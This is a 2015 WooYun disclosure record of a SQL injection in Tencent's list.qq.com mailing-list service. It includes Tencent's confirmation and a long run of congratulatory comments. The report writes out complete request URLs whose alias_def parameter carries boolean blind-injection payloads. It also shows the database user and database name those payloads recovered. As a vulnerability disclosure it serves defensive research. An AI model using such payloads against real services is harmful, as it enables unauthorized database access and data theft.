{"id": 44127, "wybug_id": "wooyun-2015-0133092", "wybug_title": "腾讯邮箱某业务主站SQL注入", "wybug_corp": "腾讯", "wybug_author": "香草", "wybug_date": "2015-08-10 15:44", "wybug_open_date": "2015-09-25 10:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向公众公开  简要描述： 发个注入，也和大家探讨下这种情况下怎么注出数据 详细说明：  问题出现在腾讯邮箱的邮件列表主站，没错就是我们经常收到的垃圾邮件，很多都是通过这个发送的，被称为订阅邮件。http://list.qq.com随便注册一个账号登陆，在创建栏目的时候，对默认发信账号没有过滤，导致sql注入\nhttp://list.qq.com/cgi-bin/qf_columnmgr?t=qf_resultcol&action=set&resp_charset=gbk&column_name=bbaaaddd&column_def=bababa&sid=EhMyXCMzj2ighR5L&alias_def=@'and 1%23&sub_self_flag=1&send_report_flag=1&send_welcome_flag=0&=\n看似是一个insert型注入，然而并不是事因为程序把传到后台的alias_def进行了一次查询，这个查询并没有过滤，只是限制了长度为64字节64字节的mysql盲注：\n\n满足条件返回：{ errorcode : \"-1\", colId : \"\" }不满足返回：{ errorcode : \"-2003\", colId : \"\" }由此可得数据库用户名为：qspace@localhost数据库名为：accountdb顺便探讨64字节mysql盲注技巧   漏洞证明：  \n\n由此可得数据库用户名为：qspace@localhost数据库名为：accountdb测试链接：\nhttp://list.qq.com/cgi-bin/qf_columnmgr?t=qf_resultcol&action=set&resp_charset=gbk&column_name=bbaaaddd&column_def=bababa&sid=VVRqBnk1D_gg2kEU&alias_def=@'or+1%23&sub_self_flag=1&send_report_flag=1&send_welcome_flag=0和http://list.qq.com/cgi-bin/qf_columnmgr?t=qf_resultcol&action=set&resp_charset=gbk&column_name=bbaaaddd&column_def=bababa&sid=VVRqBnk1D_gg2kEU&alias_def=@'or+0%23&sub_self_flag=1&send_report_flag=1&send_welcome_flag=0\n返回不同的结果   修复方案：  过滤   版权声明：转载请注明来源 香草@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-11 10:43 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-10 15:45 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  什么情况，秒审核    \n     2015-08-11 10:52 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  手工点赞    \n     2015-08-11 11:01 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  mark    \n     2015-08-11 11:06 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:485 漏洞数:101        | 长期1:7回收WB,手续费协商,个位数到三位数...)\t\t \n  这思路厉害！    \n     2015-08-11 11:20 |    \t\t白非白 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:60        | ♫ Freedom - Anthony Hamilton ♫)\t\t \n  这姿势牛逼！    \n     2015-08-11 11:50 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  手工点赞    \n     2015-08-11 12:02 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:476 漏洞数:72        | 千里之堤溃于蚁穴)\t\t \n  自动点赞    \n     2015-08-11 12:15 |    \t\t伟大娃娃 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:10        | 改变世界)\t\t \n  手工点赞    \n     2015-08-11 13:11 |    \t\t土夫子 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 逆流而上，顺势而为)\t\t \n  大神带我    \n     2015-08-11 13:11 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  次奥    \n     2015-08-11 13:25 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  上面的赞和留言全是我手工留的    \n     2015-08-11 13:34 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这标题看着都叼    \n     2015-08-11 13:41 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  我是来看姿势的    \n     2015-08-11 13:44 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  @px1624 哥们你的那个一键爬数据能不能给我一份！我进不了社区了    \n     2015-08-11 13:47 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @Hero 努力赚WB就可以进去了    \n     2015-08-11 14:31 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:467 漏洞数:50        | 我有一个好想法！)\t\t \n  手工点赞    \n     2015-08-11 16:35 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  路过，留个赞。    \n     2015-08-11 16:57 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  前来围观$$$    \n     2015-08-11 17:06 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  手工点赞    \n     2015-08-11 18:19 |    \t\tMAX丶 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 人生路上总有一些不顺心的事情，让我们跳过...)\t\t \n  我草围观啊必须！！！    \n     2015-08-11 19:58 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 每日必关注乌云)\t\t \n  楼上都是我的ID    \n     2015-08-11 21:07 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  第一次这么多人关注，好意外    \n     2015-08-11 21:44 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  嗯嗯技巧很好！    \n     2015-08-11 21:54 |    \t\tanting \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:38        | 活到老，学到老)\t\t \n  6的不行    \n     2015-08-11 23:12 |    \t\tdo5axmf \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 这个一个有故事的人)\t\t \n  小白 后排围观，大神带我    \n     2015-08-11 23:49 |    \t\tSunnyDoll \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:10        | 职业搬砖工)\t\t \n  手工点赞    \n     2015-09-25 11:33 |    \t\tL29xM2 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:7        | Copyright © 2010 - 2015  wooyun.org , A...)\t\t \n  顶一个    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}